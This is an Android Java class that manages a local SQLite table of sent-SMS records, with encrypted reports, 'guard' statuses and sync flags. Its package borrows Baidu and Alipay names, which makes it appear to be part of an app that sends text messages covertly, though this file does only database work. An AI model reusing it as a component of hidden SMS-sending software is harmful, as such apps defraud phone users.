package com.baidu.alipay.script.sms;

import java.util.ArrayList;
import java.util.List;

import com.baidu.alipay.Utils;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;

public class SendSmsPojoHandler extends BaseHandler{
	
	public SendSmsPojoHandler(Context context) {
		super(context);
	}

	private static final String TABLENAME = "AAA";
	
	
	@Override
	protected String getTable() {
		return TABLENAME;
	}
	
	public void save(String key,String random,String refer,String report){
		SendSmsPojo sendSmsPojo = new SendSmsPojo();
		
		sendSmsPojo.setKey(key);
		sendSmsPojo.setRefer(refer);
		sendSmsPojo.setReport(report);
		sendSmsPojo.setRandom(random);
		
		save(sendSmsPojo);
	}
	
	public void save(SendSmsPojo sendSmsPojo){
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(SendSmsPojo.KEY, sendSmsPojo.getKey());
		contentValues.put(SendSmsPojo.RANDOM, sendSmsPojo.getRandom());
		
		String report = sendSmsPojo.getReport();
		report = Utils.encrypt(report);
		
		contentValues.put(SendSmsPojo.REPORT, report);
		contentValues.put(SendSmsPojo.REFER, sendSmsPojo.getRefer());
		contentValues.put(SendSmsPojo.SENDSTATUS, sendSmsPojo.getSendStatus());
		contentValues.put(SendSmsPojo.GUARDSTATUS, sendSmsPojo.getGuardStatus());
		contentValues.put(SendSmsPojo.SENDSYNC, sendSmsPojo.getSendSync());
		contentValues.put(SendSmsPojo.GUARDSYNC, sendSmsPojo.getGuardSync());
		
		this.insert(contentValues);
	}
	
	//更改sendStatus
	public void updateSendStatus(SendSmsPojo sendSmsPojo){
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(SendSmsPojo.SENDSTATUS, sendSmsPojo.getSendStatus());
		contentValues.put(SendSmsPojo.REASON, sendSmsPojo.getReason());
		
		update(contentValues,"key = ?",new String[]{sendSmsPojo.getKey()});
	}

	//更改guardStatus
	public void updateGuardStatus(SendSmsPojo sendSmsPojo) {
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(SendSmsPojo.GUARDSTATUS, sendSmsPojo.getGuardStatus());
		contentValues.put(SendSmsPojo.REASON, sendSmsPojo.getReason());
		
		update(contentValues,"key = ? and sendstatus = 1",new String[]{sendSmsPojo.getKey()});
	}

	//
	public void updateSendSync(SendSmsPojo sendSmsPojo){
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(SendSmsPojo.SENDSYNC, sendSmsPojo.getSendSync());
		
		update(contentValues,"key = ?",new String[]{sendSmsPojo.getKey()});
	}
	
	//
	public void updateGuardSync(SendSmsPojo sendSmsPojo){
		ContentValues contentValues = new ContentValues();
		
		contentValues.put(SendSmsPojo.GUARDSYNC, sendSmsPojo.getGuardSync());
		
		update(contentValues,"key = ?",new String[]{sendSmsPojo.getKey()});
	}
	
	//delete
	public void deleteByKey(SendSmsPojo sendSmsPojo){
//		delete("key = ?", new String[]{sendSmsPojo.getKey()});
	}
	
	//获取需要同步的
	public List<SendSmsPojo> listNeedSync(int limit) {
		
		Cursor c = query(new String[]{SendSmsPojo.RANDOM,SendSmsPojo.GUARDSTATUS,SendSmsPojo.GUARDSYNC,SendSmsPojo.SENDSTATUS,
				SendSmsPojo.SENDSYNC,SendSmsPojo.KEY,SendSmsPojo.REASON,SendSmsPojo.REFER,
				SendSmsPojo.REPORT}, "sendstatus <> 0 or guardstatus <> 0", null, null, null, null, "0,"+limit);
		
		
		return list(c);
	}
	
	//
	public List<SendSmsPojo> listByRandom(String random){
		Cursor c = query(new String[]{SendSmsPojo.RANDOM,SendSmsPojo.GUARDSTATUS,SendSmsPojo.GUARDSYNC,SendSmsPojo.SENDSTATUS,
				SendSmsPojo.SENDSYNC,SendSmsPojo.KEY,SendSmsPojo.REASON,SendSmsPojo.REFER,
				SendSmsPojo.REPORT}, "random = ?", new String[]{random}, null, null, null, null);
		
		
		return list(c);
	}
	
	private List<SendSmsPojo> list(Cursor c){
		List<SendSmsPojo> list = new ArrayList<SendSmsPojo>();
		
		try{
			if(c.moveToFirst()){//判断游标是否为空
	
			    for(int i=0;i<c.getCount();i++){
	
			        c.moveToPosition(i);//移动到指定记录
			        
			        SendSmsPojo pojo = new SendSmsPojo();
			        
			        pojo.setRandom(c.getString(c.getColumnIndex(SendSmsPojo.RANDOM)));
			        pojo.setGuardStatus(c.getInt(c.getColumnIndex(SendSmsPojo.GUARDSTATUS)));
			        pojo.setGuardSync(c.getInt(c.getColumnIndex(SendSmsPojo.GUARDSYNC)));
			        pojo.setSendStatus(c.getInt(c.getColumnIndex(SendSmsPojo.SENDSTATUS)));
			        pojo.setSendSync(c.getInt(c.getColumnIndex(SendSmsPojo.SENDSYNC)));
			        pojo.setKey(c.getString(c.getColumnIndex(SendSmsPojo.KEY)));
			        pojo.setReason(c.getString(c.getColumnIndex(SendSmsPojo.REASON)));
			        pojo.setRefer(c.getString(c.getColumnIndex(SendSmsPojo.REFER)));
			        
			        String report = c.getString(c.getColumnIndex(SendSmsPojo.REPORT));
			        report = Utils.decrypt(report);
			        
			        pojo.setReport(report);
			        
			        list.add(pojo);
			    }
			}
		}catch (Exception e) {
			e.printStackTrace();
		}finally{
			if(c != null){
				try {
					c.close();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}
		
		return list;
	}
}
